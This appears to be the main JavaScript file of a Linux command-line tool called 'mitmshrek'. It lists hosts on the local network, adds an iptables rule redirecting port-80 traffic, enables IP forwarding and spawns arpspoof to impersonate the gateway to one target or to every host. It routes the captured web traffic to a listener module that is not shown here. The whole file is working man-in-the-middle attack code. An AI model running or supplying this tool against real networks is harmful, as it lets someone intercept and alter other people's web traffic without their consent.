const findHosts = require('./netscan');
const utils = require('./utils');
const Shreker = require('./shreker');
const readline = require('readline');
const childProcess = require('child_process');

let cleanup = process.exit;

async function list () {
    let networkInfo = await utils.getNetworkInfo();
    let hosts = await findHosts(networkInfo.cidr_block);
    console.log(JSON.stringify(hosts, null, 2));
}

async function info () {
    let networkInfo = await utils.getNetworkInfo();
    console.log(JSON.stringify(networkInfo, null, 2));
}

async function main(target) {

    let iptablesArgs = ['-t', 'nat', '-C', 'PREROUTING', '-p', 'tcp', '--dport', '80','-j', 'REDIRECT'];

    try {
        console.log('checking for iptables rule');
        await utils.simpleExec('iptables', iptablesArgs);
        console.log('iptables rule already exists');
    } catch (e) {
        if (e.status === 1) {
            //iptables rule does not exist
            console.log('adding iptables rule');
            iptablesArgs[2] = '-A';
            await utils.simpleExec('iptables', iptablesArgs);
        } else {
            throw e;
        }
    }

    console.log('enabling ipv4 forwarding');
    await utils.simpleExec ('sysctl', ['-w', 'net.ipv4.ip_forward=1']);

    console.log('finding mac address for ' + target);
    let host = (await findHosts(target))[0];

    if (host === undefined) {
        throw new Error('unable to find mac address for ' + target);
    }

    console.log('adding ' + target + ' -> ' + host.mac + ' to arp table');
    await utils.simpleExec('arp', ['-s', target, host.mac]);

    let shreker = new Shreker();
    shreker.start();
    console.log('shreker listening');

    console.log('getting network info');
    let networkInfo = await utils.getNetworkInfo();

    let args = ['-i', networkInfo.name];
    if (target) {
        args.push('-t', target);
    }
    args.push(networkInfo.gateway_ip);

    console.log('spawning arpspoof');
    let arpspoof = childProcess.spawn('arpspoof', args);

    arpspoof.on('error', err => {
        console.log('arpspoof error', err);
        process.exit(6);
    });

    arpspoof.stdout.pipe(process.stdout);
    arpspoof.stderr.pipe(process.stderr);

    let shouldEnd = false;
    let arpspoofRunning = true;

    arpspoof.on('exit', (code, signal) => {
        arpspoofRunning = false;
        if (code !== 0) {
            console.log('arpspoof ended with exit code ' + code + ' from signal ' + signal);
        }
        if (shouldEnd) {
            process.exit(0);
        }
    });

    await new Promise(resolve => {
        cleanup = () => {
            if (arpspoofRunning) {
                shouldEnd = true;
                arpspoof.kill('SIGINT');
            } else {
                resolve();
            }
        };
    });
}

const usage = 'usage:\n\tmitmshrek target <ip address>\n\tmitmshrek all\n\tmitmshrek list\n\tmitmshrek info\n\tmitmshrek help';

if (process.platform !== 'linux') {
    console.error('only linux is supported currently');
    process.exit(1);
} else if (process.argv.length === 2) {
    console.error(usage);
    process.exit(2);
} else {
    let promise;

    let action = process.argv[2];
    if (action === 'list') {
        promise = list();
    } else if (action === 'info') {
        promise = info();
    } else if (action === 'all') {
        promise = main();
    } else if (action === 'help') {
        console.error(usage);
        process.exit(0);
    } else if (action === 'target') {
        if (process.argv.length === 4) {
            promise = main(process.argv[3]);
        } else {
            console.error(usage);
            process.exit(3);
        }
    }

    promise.then(() => {
        cleanup();
    }).catch(err => {
        console.error(err);
        process.exit(4);
    });
}

process.on('SIGINT', () => {
    console.log('caught SIGINT, cleaning up');
    cleanup()
});

readline.createInterface(process.stdin, process.stdout).on('line', () => {
    console.log('read line, cleaning up');
    cleanup();
});